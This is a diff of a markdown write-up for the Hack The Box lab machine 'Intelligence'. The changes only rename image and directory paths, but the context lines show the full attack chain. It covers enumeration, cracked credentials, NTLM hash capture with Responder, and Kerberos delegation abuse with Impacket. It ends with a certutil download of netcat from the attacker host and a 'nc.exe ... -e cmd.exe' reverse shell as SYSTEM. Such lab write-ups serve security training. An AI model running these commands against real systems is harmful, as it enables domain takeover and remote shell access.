@@ -8,40 +8,40 @@ We started with a full port scan and then we executed a port scan only on the op
 nmap -vv -A -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49685,49686,49695,49707,59805 -oA nmap/intelligence 10.10.10.248
 ```
 
-![](Intelligence/Untitled.png)
+![](images/Untitled.png)
 
-![](Intelligence/Untitled%201.png)
+![](images/Untitled%201.png)
 
-![](Intelligence/Untitled%202.png)
+![](images/Untitled%202.png)
 
-![](Intelligence/Untitled%203.png)
+![](images/Untitled%203.png)
 
-![](Intelligence/Untitled%204.png)
+![](images/Untitled%204.png)
 
 First, we can see that the certificates issued a host DNS name. Let's write it down in our hosts’ file
 
-![](Intelligence/Untitled%205.png)
+![](images/Untitled%205.png)
 
 Accessing the webpage we could see the following page
 
-![](Intelligence/Untitled%206.png)
+![](images/Untitled%206.png)
 
 We notice that has some download links on the home page
 
-![](Intelligence/Untitled%207.png)
+![](images/Untitled%207.png)
 
 Open these files, we can see that are simple PDF files
 
-![](Intelligence/Untitled%208.png)
+![](images/Untitled%208.png)
 
-![](Intelligence/Untitled%209.png)
+![](images/Untitled%209.png)
 
 Let's analyze these files deeply using ExifTool to investigate metadata.
 
 In the first file, we got this:
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/docs]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/docs]
 └──╼ [★]$ exiftool 2020-01-01-upload.pdf
 ExifTool Version Number         : 12.16
 File Name                       : 2020-01-01-upload.pdf
@@ -63,7 +63,7 @@ Creator                         : William.Lee
 The second one:
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/docs]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/docs]
 └──╼ [★]$ exiftool 2020-12-15-upload.pdf
 ExifTool Version Number         : 12.16
 File Name                       : 2020-12-15-upload.pdf
@@ -138,7 +138,7 @@ f.close()
 
 After a lot of work, we got the file named 2020-06-04-upload.pdf there is a password
 
-![](Intelligence/Untitled%2010.png)
+![](images/Untitled%2010.png)
 
 After some trials, we got the credentials for user tiffany.molina
 
@@ -149,7 +149,7 @@ After some trials, we got the credentials for user tiffany.molina
 `Ted.Graves:Mr.Teddy`
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
@@ -165,7 +165,7 @@ Executing a brute-force directories, we got the following results
 gence_root.out
 ```
 
-![](Intelligence/Untitled%2011.png)
+![](images/Untitled%2011.png)
 
 Executing another gobuster on the documents' directory, we have found nothing
 
@@ -222,7 +222,7 @@ LDAP        10.10.10.248    389    DC               [*] Windows 10.0 Build 17763
 With the Tiffany's credentials, we could enumerate some smb shares
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ smbclient -L //10.10.10.248 -U "tiffany.molina"
 Enter WORKGROUP\tiffany.molina's password: 
 
@@ -241,7 +241,7 @@ SMB1 disabled -- no workgroup available
 In IT share, we've got
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ smbclient //10.10.10.248/IT -U "tiffany.molina"
 Enter WORKGROUP\tiffany.molina's password: 
 Try "help" to get a list of possible commands.
@@ -253,7 +253,7 @@ smb: \> ls
 
 In Users Share, we've got the whole user's folder from the system and get the user flag on the Desktop of Tiffany Molina
 
-![](Intelligence/Untitled%2012.png)
+![](images/Untitled%2012.png)
 
 We also can enumerate all users on the system
 
@@ -289,7 +289,7 @@ Well, that script is a PowerShell script that uses an LDAP query to see if it fi
 We've got some config files on SMB share SYSVOL which are
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ cat GptTmpl01.inf 
 [Unicode]
 Unicode=yes
@@ -320,7 +320,7 @@ MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
 And
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ cat GptTmpl02.inf 
 [Unicode]
 Unicode=yes
@@ -378,7 +378,7 @@ After that, we ran the responder to get the hash of user Ted.
 ## Responder
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]                                                                                                         
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]                                                                                                         
 └──╼ [★]$ sudo responder -I tun0 -Prv
 
 [HTTP] Sending NTLM authentication request to 10.10.10.248
@@ -398,7 +398,7 @@ Ted.Graves::intelligence:9699a0a712bca2a4:0C6EBDFE74D97EA1835FC3E568847A98:01010
 Running `hashcat`, we could crack Ted's hash.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation/hashes]                                                                                                  
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation/hashes]                                                                                                  
 └──╼ [★]$ hashcat -m 5600 ted.graves.hash /usr/share/wordlists/rockyou.txt
 
 TED.GRAVES::intelligence:9699a0a712bca2a4:0c6ebdfe74d97ea1835fc3e568847a98:010100000000000033a75b370d76d701a8f7dec2fdec0c560000000002000800320033003700440001001e00570049004e002d005400520030003100520043004c004c004b00440034000400140032003300370044002e004c004f00430041004c0003003400570049004e002d005400520030003100520043004c004c004b00440034002e0032003300370044002e004c004f00430041004c000500140032003300370044002e004c004f00430041004c0008003000300000000000000000000000002000007de84aa7c829529dbd347fcb7e5974a21e5ea753f4b4fc9fbbf235c737c604d60a001000000000000000000000000000000000000900400048005400540050002f007700650062006a007000660064006500760073002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
@@ -407,7 +407,7 @@ TED.GRAVES::intelligence:9699a0a712bca2a4:0c6ebdfe74d97ea1835fc3e568847a98:01010
 Executing `crackmapexec` using Ted's credentials, we got this.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ crackmapexec smb 10.10.10.248 -u ted.graves -p 'Mr.Teddy'
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\ted.graves:Mr.Teddy
@@ -420,7 +420,7 @@ After some research, we've found an interesting article.
 After some more research, we were able to use the [findDelegation.py](http://finddelegation.py) tool from Impacket to find the right SPN name and account.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation/privesc]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation/privesc]
 └──╼ [★]$ /opt/impacket/build/scripts-3.9/findDelegation.py intelligence.htb/ted.graves:'Mr.Teddy' -dc-ip 10.10.10.248
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
 
@@ -443,14 +443,14 @@ svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
 We've faced some date time problems, so we got to run this command to sync our time machine with the box.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ sudo net time set -S 10.10.10.248
 ```
 
 Then execute the `[getST.py](http://getst.py)` to catch an Administrator user Service Ticket and it will save it in `Administrator.ccache`
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ /opt/impacket/build/scripts-3.9/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
 
@@ -464,14 +464,14 @@ Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corpo
 We have to export a variable `KRB5CCNAME` and set its value with the `Administrator.ccache`
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ export KRB5CCNAME=Administrator.ccache
 ```
 
 Running [atexec.py](http://atexec.py) we tried to run the `whoami` command to verify if we could get `nt authority\system`
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ /opt/impacket/build/scripts-3.9/atexec.py -k -no-pass dc.intelligence.htb 'whoami'
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
 
@@ -486,7 +486,7 @@ nt authority\system
 Now, let's try to upload a `nc64.exe` into the box.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ /opt/impacket/build/scripts-3.9/atexec.py -k -no-pass dc.intelligence.htb 'certutil.exe -urlcache -f http://10.10.16.200:8000/nc64.exe nc.exe'
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
 
@@ -503,7 +503,7 @@ CertUtil: -URLCache command completed successfully.
 And we got a shell using the Netcat that was uploaded to the machine.
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]                                                                                                         
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]                                                                                                         
 └──╼ [★]$ /opt/impacket/build/scripts-3.9/atexec.py -k -no-pass dc.intelligence.htb 'nc.exe 10.10.16.200 443 -e cmd.exe'                                                                    
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
 
@@ -516,7 +516,7 @@ Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corpo
 ```
 
 ```bash
-─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/Intelligence/exploitation]
+─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
 └──╼ [★]$ nc -vnlp 443
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
@@ -531,4 +531,4 @@ whoami
 nt authority\system
 ```
 
-![](Intelligence/Untitled%2013.png)
+![](images/Untitled%2013.png)
